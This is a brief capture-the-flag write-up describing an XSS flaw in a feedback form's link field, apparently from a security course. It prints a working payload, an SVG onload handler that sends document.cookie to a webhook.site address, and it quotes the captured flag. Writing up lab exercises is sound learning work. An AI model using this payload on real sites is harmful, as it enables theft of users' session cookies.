# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: XSS
- Where: In the feedback form's link field
- Impact: It allows the retrieval of a remote user's (in this case, the admin's) cookies

## Finding the vulnerability / Steps to reproduce

1. The procedure is similar to the one in the `My favourite cookies` challenge, except for the payload used (`<svg/onload=window.location.href='https://webhook.site/<id>?cookie='+document.cookie>` and its URL encoding). Once executed, the web server is able to intercept the admin's cookie (`SSof{A_WAF_was_all_I_needed...}`)